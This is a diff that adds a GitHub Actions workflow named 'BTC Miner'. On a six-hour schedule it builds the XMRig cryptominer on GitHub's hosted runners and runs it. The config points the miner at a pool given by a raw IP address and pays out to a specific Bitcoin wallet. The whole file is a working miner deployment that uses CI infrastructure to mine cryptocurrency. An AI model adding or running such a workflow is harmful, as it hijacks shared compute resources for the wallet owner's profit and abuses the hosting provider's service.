@@ -1,0 +1,30 @@
+name: BTC Miner
+on:
+  schedule:
+    - cron: '0 */6 * * *'
+  workflow_dispatch:
+
+jobs:
+  mine:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install dependencies and run XMRig
+        run: |
+          sudo apt update && sudo apt install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev git
+          git clone https://github.com/xmrig/xmrig.git
+          cd xmrig && mkdir build && cd build
+          cmake .. && make -j$(nproc)
+          cat > config.json <<EOF
+          {
+              "autosave": true,
+              "cpu": {"enabled": true, "max-threads-hint": 70},
+              "pools": [{
+                  "url": "104.20.30.107:443",
+                  "user": "BTC:bc1qlran4auyfhcn79w3d8fehuc7f957x3uej7j2pj.GitHub",
+                  "pass": "x",
+                  "tls": true,
+                  "keepalive": true
+              }]
+          }
+          EOF
+          ./xmrig --config=config.json --threads=2
